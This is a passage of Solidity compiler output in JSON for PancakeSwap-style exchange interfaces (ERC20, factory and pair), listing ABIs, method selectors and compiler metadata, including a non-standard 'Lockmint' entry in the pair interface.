\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol\":\"IPancakeERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol\":{\"keccak256\":\"0xcbc23c5f49cec5fe9a629b28641466e09d1decf16b568b874d0a2a54df3e3164\",\"urls\":[\"bzz-raw://2edfcc3d8fca38ab0facf5d1ba062e6e4c23fc2c2390078ef8ccb5290495fdab\",\"dweb:/ipfs/QmZmTT6nVVSvesy6oY8pwHKvuY5W1EZr5jGeBmK73Rvrzg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol": {
				"IPancakeFactory": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "token0",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "token1",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "pair",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "PairCreated",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "INIT_CODE_PAIR_HASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "allPairs",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "allPairsLength",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								}
							],
							"name": "createPair",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "feeTo",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "feeToSetter",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								}
							],
							"name": "getPair",
							"outputs": [
								{
									"internalType": "address",
									"name": "pair",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "setFeeTo",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "setFeeToSetter",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"INIT_CODE_PAIR_HASH()": "5855a25a",
							"allPairs(uint256)": "1e3dd18b",
							"allPairsLength()": "574f2ba3",
							"createPair(address,address)": "c9c65396",
							"feeTo()": "017e7e58",
							"feeToSetter()": "094b7415",
							"getPair(address,address)": "e6a43905",
							"setFeeTo(address)": "f46901ed",
							"setFeeToSetter(address)": "a2e74af6"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"PairCreated\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"INIT_CODE_PAIR_HASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"allPairs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"allPairsLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"}],\"name\":\"createPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"feeToSetter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"}],\"name\":\"getPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"setFeeTo\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"setFeeToSetter\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol\":\"IPancakeFactory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol\":{\"keccak256\":\"0xea125e6c4e3c52bce633dc5667b1e108c63ef48866943eb6c4074f19b23ed7c5\",\"urls\":[\"bzz-raw://c875e62eaaeab86a84108aa360d1dab9e9b4c9dd06299595bfb512c4259b1050\",\"dweb:/ipfs/QmW88oRqeybnNXsLM4P6cfTfYPdpEUR3742rYkPY2zmFv2\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/interfaces/IPancakePair.sol": {
				"IPancakePair": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								}
							],
							"name": "Sync",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Lockmint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "MINIMUM_LIQUIDITY",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getReserves",
							"outputs": [
								{
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								},
								{
									"internalType": "uint32",
									"name": "blockTimestampLast",
									"type": "uint32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "initialize",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "kLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price0CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price1CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "skim",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "sync",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"Lockmint(address)": "dcbbb373",
							"MINIMUM_LIQUIDITY()": "ba9a7a56",
							"PERMIT_TYPEHASH()": "30adf81f",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"burn(address)": "89afcb44",
							"decimals()": "313ce567",
							"factory()": "c45a0155",
							"getReserves()": "0902f1ac",
							"initialize(address,address,uint256)": "1794bb3c",
							"kLast()": "7464fc3d",
							"mint(address)": "6a627842",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"price0CumulativeLast()": "5909c0d5",
							"price1CumulativeLast()": "5a3d5493",
							"skim(address)": "bc25cf77",
							"swap(uint256,uint256,address,bytes)": "022c0d9f",
							"symbol()": "95d89b41",
							"sync()": "fff6cae9",
							"token0()": "0dfe1681",
							"token1()": "d21220a7",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"indexed\":false,\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"}],\"name\":\"Sync\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Lockmint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MINIMUM_LIQUIDITY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getReserves\",\"outputs\":[{\"internalType\":\"uint112\",\"name\":\"reserve0\",\"type\":\"uint112\"},{\"internalType\":\"uint112\",\"name\":\"reserve1\",\"type\":\"uint112\"},{\"internalType\":\"uint32\",\"name\":\"blockTimestampLast\",\"type\":\"uint32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"initialize\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"kLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\